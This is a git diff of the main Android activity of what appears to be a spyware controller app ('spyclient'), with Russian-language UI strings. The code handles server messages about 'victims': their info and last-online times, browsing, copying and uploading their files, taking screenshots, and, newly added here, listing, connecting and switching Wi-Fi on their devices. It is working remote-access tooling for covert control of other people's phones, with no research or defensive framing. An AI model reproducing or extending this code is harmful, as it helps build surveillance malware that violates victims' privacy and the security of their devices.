@@ -1,6 +1,7 @@
 package slade.carter.spyclient;
 
 import android.content.Intent;
+import android.net.NetworkInfo;
 import android.os.Bundle;
 import android.support.v7.app.AppCompatActivity;
 import android.view.View;
@@ -135,7 +136,6 @@ public class MainActivity extends AppCompatActivity {
                             case FILE_ISNT_DIRECTORY:
                                 showText("Это не папка!");
                                 FileManagerActivity.getInstance().removeLastFile();
-                                FileManagerActivity.getInstance().isClicked = true;
                                 return;
                             case PROCESS:
                                 showText("Получаем файлы...");
@@ -147,6 +147,10 @@ public class MainActivity extends AppCompatActivity {
                     }
                     JSONArray files = (JSONArray) message.get("files");
                     FileManagerActivity.getInstance().initFilesList(files);
+                    break;
+                case "get.wifi.list":
+                    JSONArray wifiList = (JSONArray) message.get("wifiList");
+                    WifiManagerActivity.getInstance().initWifiList(wifiList);
                     break;
                 case "rename.file":
                     switch ((String) message.get("code")) {
@@ -163,7 +167,6 @@ public class MainActivity extends AppCompatActivity {
                     }
                     break;
                 case "copy.file":
-                    FileManagerActivity.getInstance().isClicked = true;
                     switch ((String) message.get("code")) {
                         case PROCESS:
                             showText("Копируем...");
@@ -206,24 +209,20 @@ public class MainActivity extends AppCompatActivity {
                             return;
                     }
                     break;
-                /*case "getFileInfo":
-                    if (message.has("code")) {
-                        switch (message.getString("code")) {
-                            case PROCESS:
-                                showText("Получаем информацию...");
-                                return;
-                        }
-                    }
-
-                    String fullPath = message.getString("fullPath");
-                    long size = message.getLong("size");
-                    String lastModified = message.getString("lastModifiedTime");
-                    FileManagerActivity.getInstance().initFileInfo(fullPath, size, lastModified);
-                    break;*/
-                case "get.victim.info":
+                case "get.file.info":
                     String victim = (String) message.get("victim");
                     JSONObject info = (JSONObject) message.get("info");
+                    FileManagerActivity.getInstance().initFileInfo(victim, info);
+                    break;
+                case "get.victim.info":
+                    victim = (String) message.get("victim");
+                    info = (JSONObject) message.get("info");
                     VictimsActivity.getInstance().initVictimInfo(victim, info);
+                    break;
+                case "get.last.online":
+                    victim = (String) message.get("victim");
+                    String lastOnline = (String) message.get("lastOnline");
+                    VictimsActivity.getInstance().initVictimLastOnline(victim, lastOnline);
                     break;
                 case "start.upload.file":
                     UploadThread upload = new UploadThread((String) message.get("path"), ((Long) message.get("port")).intValue());
@@ -249,9 +248,6 @@ public class MainActivity extends AppCompatActivity {
                     break;
                 case "take.screen":
                     switch ((String) message.get("code")) {
-                        /*case PROCESS:
-                            showText("Создаем...");
-                            return;*/
                         case SUCCESS:
                             showText("Скрин экрана сохранен!");
                             FileManagerActivity.getInstance().send_getFiles();
@@ -260,6 +256,21 @@ public class MainActivity extends AppCompatActivity {
                             showText("Не удалось сделать скрин!");
                             return;
                     }
+                    break;
+                case "wifi.connect":
+                    switch ((String) message.get("code")) {
+                        case SUCCESS:
+                            showText("Подключились к точке Wifi!");
+                            return;
+                        case ERROR:
+                            showText("Не удалось подключиться к точке Wifi!");
+                            return;
+                    }
+                    break;
+                case "set.wifi.enabled":
+                    boolean wifiState = (Boolean) message.get("wifiState");
+                    if (wifiState) showText("Wifi включен!");
+                    else showText("Wifi выключен!");
                     break;
                 /*case "setName":
                     switch (message.getString("code")) {
